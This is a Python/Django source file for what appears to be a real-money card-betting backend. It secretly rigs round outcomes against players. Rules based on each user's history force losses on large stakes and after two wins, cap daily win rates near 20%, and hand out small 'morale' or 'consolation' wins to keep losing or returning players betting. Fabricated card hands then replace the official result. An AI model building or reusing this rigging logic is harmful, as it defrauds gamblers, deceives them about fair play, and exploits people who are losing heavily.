# backend/bets/machine.py
from __future__ import annotations

import random
from dataclasses import dataclass, asdict
from decimal import Decimal
from datetime import timedelta
from typing import Dict, List, Optional, Tuple

from django.utils import timezone
from django.db.models import Sum, Count, Case, When, Value, DecimalField
from django.db.models.functions import TruncDate

from .models import Bet
from users.models import User

# ──────────────────────────────────────────────────────────────────────────────
# Public API
# ──────────────────────────────────────────────────────────────────────────────

@dataclass
class BiasedDecision:
    use_biased: bool
    winner: Optional[str] = None           # "A" or "B"
    player_a_full: Optional[List[str]] = None
    player_b_full: Optional[List[str]] = None
    rule_id: Optional[str] = None          # which rule triggered
    note: Optional[str] = None             # human note for logs


@dataclass
class SessionStats:
    bets_today: int
    wins_today: int
    losses_today: int
    net_today: Decimal
    placed_today: int
    cons_wins: int
    cons_losses: int
    avg_stake_recent: Decimal
    max_stake_recent: Decimal
    y_wins: int
    y_losses: int
    days_active_streak: int
    days_since_last_play: int
    total_today: int

# ──────────────────────────────────────────────────────────────────────────────
# Pretty helpers (only these three prints are left)
# ──────────────────────────────────────────────────────────────────────────────

def _fmt_amt(x: Decimal) -> str:
    if x is None:
        x = Decimal("0")
    x = x.quantize(Decimal("0.00"))
    return f"₹{x:,.2f}"

def _sum_profit_loss(qs):
    agg = qs.aggregate(
        profit=Sum(Case(When(net__gt=0, then="net"), default=Value(0), output_field=DecimalField(max_digits=20, decimal_places=2))),
        loss_raw=Sum(Case(When(net__lt=0, then="net"), default=Value(0), output_field=DecimalField(max_digits=20, decimal_places=2))),
        net=Sum("net"),
    )
    profit = agg.get("profit") or Decimal("0")
    loss = -(agg.get("loss_raw") or Decimal("0"))  # make positive
    net = agg.get("net") or Decimal("0")
    return profit, loss, net

def _print_simple_metrics(user: User, stats: "SessionStats") -> None:
    # Today settled window
    tz = timezone.get_current_timezone()
    today_start = timezone.now().astimezone(tz).replace(hour=0, minute=0, second=0, microsecond=0)
    today_end = today_start + timedelta(days=1)
    today_settled_q = Bet.objects.filter(user=user, settled_at__gte=today_start, settled_at__lt=today_end)
    today_profit, today_loss, today_net = _sum_profit_loss(today_settled_q)
    today_settled = stats.wins_today + stats.losses_today

    # Lifetime
    life_settled_q = Bet.objects.filter(user=user).exclude(status="PLACED")
    life_profit, life_loss, life_net = _sum_profit_loss(life_settled_q)
    life_wins = life_settled_q.filter(status="WON").count()
    life_losses = life_settled_q.filter(status="LOST").count()
    life_settled = life_settled_q.count()
    life_played_all = Bet.objects.filter(user=user).count()
    life_open = max(life_played_all - life_settled, 0)

    # EXACT requested format (two lines)
    print(f"[today] Bets {stats.placed_today} | W/L {stats.wins_today}/{stats.losses_today} | Profit {_fmt_amt(today_profit)} | Net {_fmt_amt(today_net)}")
    print(f"[lifetime] Bets {life_played_all} (open {life_open}) | W/L {life_wins}/{life_losses} | Profit {_fmt_amt(life_profit)} | Loss {_fmt_amt(life_loss)} | Net {_fmt_amt(life_net)}")

# Friendly text for rule reasons
RULE_REASONS = {
    "S2_BIG_FIRST_LOSS": "first bet today is big (>3000) → force a loss",
    "S1_EARLY_HIGH_FORCE_LOSS": "first 3 bets & stake >200 → loss",
    "S1_ONBOARDING_SMALL_WIN": "early small-stake bet → small guided win",
    "S11_BIG_CONSOLATION": "big loss today (≤ -10,000) → one heavy consolation win",
    "S13_PUNISH_AFTER_2W": "many wins in a row (≥2) → punish with heavy loss",
    "S8_COOL_SUSPICION_SMALL_WIN": "5+ losses in a row and small stake → small win",
    "S4_CAP_20_PERCENT": "cap daily win rate at ~20%",
    "S4_NO_MORE_THAN_2W": "avoid more than 2 wins in a row today",
    "S5_MORALE_AFTER_YDAY": "bad yesterday and first bet today → small morale win",
    "S5_RETURN_EASY_WIN": "returning after gap → 1 easy win in first 3",
    "S5_STREAK_FATIGUE": "long daily streak → bias subtle loss",
    "S12_FATIGUE_MODE": "100+ matches today → fatigue mode loss",
    "DEFAULT_EDGE_ON_BIG_STAKE": "big stake vs average → house-edge loss",
    "NO_RULE": "no rule matched → follow official engine",
}

def _print_decision(user: User, *, stake: Decimal, selection: str, winner: Optional[str], rule_id: str, flavor: Optional[str], cons_wins: int, cons_losses: int):
    """
    Single decision line:
      [decision] MAKE LOSS (winner=A) | reason=S13_PUNISH_AFTER_2W - many wins in a row (≥2) | stake ₹100.00 | pick=B | cons_wins=7 cons_losses=0
    """
    if winner in ("A", "B"):
        make = "WIN" if selection == winner else "LOSS"
        win_side = f"(winner={winner})"
    else:
        make = "NO-BIAS"
        win_side = "(engine)"
    reason_text = RULE_REASONS.get(rule_id or "NO_RULE", "follow engine")
    print(
        f"[decision] MAKE {make} {win_side} | reason={rule_id or 'NO_RULE'} - {reason_text} "
        f"| stake {_fmt_amt(stake)} | pick={selection} | cons_wins={cons_wins} cons_losses={cons_losses}"
    )

# ──────────────────────────────────────────────────────────────────────────────
# Main entry
# ──────────────────────────────────────────────────────────────────────────────

def maybe_decide_biased(
    *,
    user: User,
    stake: Decimal,
    selection: str,          # "A" or "B" (what the user picked)
    round_id: str,           # public round id (string)
) -> BiasedDecision:
    # 1) Stats & simple metrics (2 lines)
    stats = _collect_stats(user)
    _print_simple_metrics(user, stats)

    # 2) Rules → outcome
    outcome = _apply_rules(user=user, stake=stake, selection=selection, stats=stats)

    if not outcome:
        # No bias: tell that we follow engine
        _print_decision(user, stake=stake, selection=selection, winner=None, rule_id="NO_RULE", flavor=None,
                        cons_wins=stats.cons_wins, cons_losses=stats.cons_losses)
        return BiasedDecision(use_biased=False)

    user_wins, flavor, rule_id = outcome
    winner = selection if user_wins else ("A" if selection == "B" else "B")

    # 3) Synthesize concrete cards for A/B
    a_full, b_full = _synthesize_cards(
        user_side=selection, winner=winner, flavor=flavor, stats=stats
    )

    # 4) Decision print (1 line)
    _print_decision(user, stake=stake, selection=selection, winner=winner, rule_id=rule_id, flavor=flavor,
                    cons_wins=stats.cons_wins, cons_losses=stats.cons_losses)

    return BiasedDecision(
        use_biased=True,
        winner=winner,
        player_a_full=a_full,
        player_b_full=b_full,
        rule_id=rule_id,
        note=f"selection={selection} stake={stake} user_wins={user_wins} flavor={flavor}",
    )

# Optional: apply to engine (no prints here)
def apply_biased_to_engine(current_round: Dict, decision: BiasedDecision) -> None:
    if not decision or not decision.use_biased:
        return
    current_round["player_a_full"] = decision.player_a_full
    current_round["player_b_full"] = decision.player_b_full
    current_round["official_result"] = decision.winner
    current_round["resolver"] = "biased"

# ──────────────────────────────────────────────────────────────────────────────
# Stats collection
# ──────────────────────────────────────────────────────────────────────────────

def _collect_stats(user: User) -> SessionStats:
    tz = timezone.get_current_timezone()
    now = timezone.now().astimezone(tz)
    today_start = now.replace(hour=0, minute=0, second=0, microsecond=0)

    # Settled today
    today_q = Bet.objects.filter(user=user, settled_at__gte=today_start, settled_at__lt=today_start + timedelta(days=1))
    wins_today = today_q.filter(status="WON").count()
    losses_today = today_q.filter(status="LOST").count()
    net_today = today_q.aggregate(s=Sum("net"))["s"] or Decimal("0")

    # Placed today
    placed_today = Bet.objects.filter(user=user, created_at__gte=today_start, created_at__lt=today_start + timedelta(days=1)).count()

    # Consecutive W/L using last 20 settled
    last20 = list(Bet.objects.filter(user=user).exclude(status="PLACED").order_by("-settled_at")[:20])
    cons_wins, cons_losses = _consecutive_counters(last20)

    # Recent stakes (last 20 placed)
    last20p = list(Bet.objects.filter(user=user).order_by("-created_at")[:20])
    avg_stake_recent = (sum([b.stake for b in last20p], Decimal(0)) / Decimal(max(len(last20p), 1))).quantize(Decimal("0.01"))
    max_stake_recent = max([b.stake for b in last20p], default=Decimal("0"))

    # Yesterday performance
    yesterday_start = today_start - timedelta(days=1)
    yesterday_end = today_start
    y_q = Bet.objects.filter(user=user, settled_at__gte=yesterday_start, settled_at__lt=yesterday_end)
    y_wins = y_q.filter(status="WON").count()
    y_losses = y_q.filter(status="LOST").count()

    # Days active streak (last 7d any activity)
    recent_days = (
        Bet.objects.filter(user=user, created_at__gte=today_start - timedelta(days=6))
        .annotate(day=TruncDate("created_at"))
        .values("day")
        .annotate(n=Count("id"))
        .order_by("-day")
    )
    day_list = [r["day"] for r in recent_days]
    days_active_streak = 0
    day_cursor = today_start.date()
    while day_cursor in day_list:
        days_active_streak += 1
        day_cursor = day_cursor - timedelta(days=1)

    last_play_row = Bet.objects.filter(user=user).order_by("-created_at").first()
    days_since_last_play = (now.date() - last_play_row.created_at.date()).days if last_play_row else 999

    total_today = wins_today + losses_today

    return SessionStats(
        bets_today=placed_today,
        wins_today=wins_today,
        losses_today=losses_today,
        net_today=net_today,
        placed_today=placed_today,
        cons_wins=cons_wins,
        cons_losses=cons_losses,
        avg_stake_recent=avg_stake_recent,
        max_stake_recent=max_stake_recent,
        y_wins=y_wins,
        y_losses=y_losses,
        days_active_streak=days_active_streak,
        days_since_last_play=days_since_last_play,
        total_today=total_today,
    )

def _consecutive_counters(bets: List[Bet]) -> Tuple[int, int]:
    cons_w = cons_l = 0
    for b in bets:
        if b.status == "WON":
            if cons_l > 0: break
            cons_w += 1
        elif b.status == "LOST":
            if cons_w > 0: break
            cons_l += 1
    return cons_w, cons_l

# ──────────────────────────────────────────────────────────────────────────────
# Rule engine
# ──────────────────────────────────────────────────────────────────────────────

def _apply_rules(*, user: User, stake: Decimal, selection: str, stats: SessionStats):
    s = stats
    st = Decimal(stake)

    # S2: Starts Betting Big Early — first bet of the day > 3000 → immediate loss (heavy)
    if s.bets_today == 0 and st > Decimal("3000"):
        return (False, "heavy", "S2_BIG_FIRST_LOSS")

    # S1: First Time Playing — first 5 games: allow 1–2 small wins; if bet > 200 in first 3 → force loss
    if s.bets_today < 5:
        if s.bets_today < 3 and st > Decimal("200"):
            return (False, "heavy", "S1_EARLY_HIGH_FORCE_LOSS")
        if s.bets_today in (1, 3) and st <= Decimal("200"):
            return (True, "small", "S1_ONBOARDING_SMALL_WIN")

    # S11: Approaches 10,000 chip loss today → one-time consolation big win
    if s.net_today <= Decimal("-10000"):
        if st <= max(Decimal("2000"), s.avg_stake_recent):
            return (True, "heavy", "S11_BIG_CONSOLATION")

    # S13: Wins Twice in a Row → punish with heavy loss
    if s.cons_wins >= 2:
        return (False, "heavy", "S13_PUNISH_AFTER_2W")

    # S8: 5+ consecutive losses → small win if small stake
    if s.cons_losses >= 5 and st < (s.avg_stake_recent * Decimal("0.7")):
        return (True, "small", "S8_COOL_SUSPICION_SMALL_WIN")

    # S4: Playing multiple times a day — cap at 20% wins and avoid >2 in a row
    if s.total_today >= 10:
        projected_wins_if_win = s.wins_today + 1
        projected_rate = projected_wins_if_win / max(s.total_today + 1, 1)
        if projected_rate > 0.20:
            return (False, "close", "S4_CAP_20_PERCENT")
        if s.cons_wins >= 2:
            return (False, "close", "S4_NO_MORE_THAN_2W")

    # S5: Cross-day morale tweaks
    if s.y_losses >= 3 and s.bets_today == 0:
        return (True, "small", "S5_MORALE_AFTER_YDAY")
    if s.days_since_last_play >= 2 and s.bets_today < 3:
        return (True, "small", "S5_RETURN_EASY_WIN")
    if s.days_active_streak >= 3:
        if random.random() < 0.65:
            return (False, "close", "S5_STREAK_FATIGUE")

    # S12: >100 matches in a day → fatigue mode (near zero win chance)
    if s.total_today >= 100:
        return (False, "heavy", "S12_FATIGUE_MODE")

    # Default bias: prefer house edge on bigger stakes
    if st >= max(Decimal("1000"), s.avg_stake_recent * Decimal("1.5")):
        return (False, "close", "DEFAULT_EDGE_ON_BIG_STAKE")

    # No rule → follow engine
    return None

# ──────────────────────────────────────────────────────────────────────────────
# Card synthesis
# ──────────────────────────────────────────────────────────────────────────────

_TEMPLATES = {
    ("lose", "close"): [
        (["QH","9H","4H"], ["KH","10H","3H"]),
        (["JD","9D","6D"], ["QD","9D","5D"]),
        (["7S","7D","3C"], ["8H","8C","2S"]),
        (["TC","9D","8S"], ["JC","TD","9S"]),
    ],
    ("lose", "heavy"): [
        (["AS","9H","4D"], ["4S","4H","4C"]),
        (["KD","QS","4C"], ["7H","8H","9H"]),
        (["QH","QD","3S"], ["KC","KS","KH"]),
    ],
    ("lose", "small"): [
        (["9S","9C","5D"], ["TS","TC","3H"]),
        (["JC","8D","5S"], ["QD","9C","6H"]),
    ],
    ("win", "small"): [
        (["7S","7C","4D"], ["QH","9C","5D"]),
        (["TC","9D","8S"], ["9C","7D","5S"]),
        (["5H","5C","2D"], ["4S","4C","8D"]),
    ],
    ("win", "close"): [
        (["QH","9H","4H"], ["JH","9H","5H"]),
        (["8S","8C","3D"], ["7D","7C","2H"]),
        (["JD","TC","9S"], ["TD","9C","8S"]),
    ],
    ("win", "heavy"): [
        (["4S","4H","4C"], ["AS","QH","9D"]),
        (["7H","8H","9H"], ["KD","QS","4C"]),
        (["KH","KS","KC"], ["QH","QD","3S"]),
    ],
}

def _synthesize_cards(
    *,
    user_side: str,     # "A" or "B"
    winner: str,        # "A" or "B"
    flavor: str,        # "small" | "close" | "heavy"
    stats: SessionStats,
) -> Tuple[List[str], List[str]]:
    user_wins = (user_side == winner)
    key = ("win" if user_wins else "lose", flavor)
    choices = _TEMPLATES.get(key) or _TEMPLATES[("win" if user_wins else "lose", "close")]
    user_hand, opp_hand = random.choice(choices)

    # Map to A/B so that 'winner' side has the stronger hand
    if winner == "A":
        a_full, b_full = (user_hand, opp_hand) if user_side == "A" else (opp_hand, user_hand)
    else:
        a_full, b_full = (opp_hand, user_hand) if user_side == "A" else (user_hand, opp_hand)

    # Small variety: sometimes shuffle suits
    if random.random() < 0.35:
        a_full = _shuffle_suits(a_full)
    if random.random() < 0.35:
        b_full = _shuffle_suits(b_full)
    return a_full, b_full

def _shuffle_suits(hand: List[str]) -> List[str]:
    suits = ["H","D","S","C"]
    mapping = {s: random.choice(suits) for s in ("H","D","S","C")}
    out = []
    for c in hand:
        v, s = c[:-1], c[-1]
        out.append(f"{v}{mapping.get(s,s)}")
    if len(set(out)) < 3:
        random.shuffle(suits)
        out = [f"{c[:-1]}{suits[i%4]}" for i, c in enumerate(hand)]
    return out
